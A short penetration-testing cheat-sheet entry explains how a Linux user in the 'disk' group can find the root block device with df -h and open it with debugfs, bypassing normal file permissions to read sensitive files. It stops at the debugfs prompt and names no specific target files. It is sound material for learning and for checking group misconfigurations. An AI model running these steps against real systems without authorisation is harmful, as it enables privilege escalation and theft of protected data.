##### ==🔵Linux `Disk` Group Abuse==

Enumerate your group memberships:
```
id
```
Expected output includes:
```
groups=...,6(disk)
```
`<username>` belongs to the disk group.

This can allow a user to access the underlying filesystem and read sensitive files

Identify the root filesystem
Run :
```
df -h
```
In `Mounted on` column , look for `/`
Look for the root filesystem (`/`).
Example:
```
/dev/mapper/ubuntu--vg-ubuntu--lv
```

Access the filesystem using debugfs
Run:
```
debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
```
You should get an interactive prompt:
```
debugfs:
```
`debugfs` is a filesystem debugging utility that can inspect an ext filesystem directly through its block device.
Since `<username>` belongs to the disk group, she can use this access to bypass normal filesystem permissions.
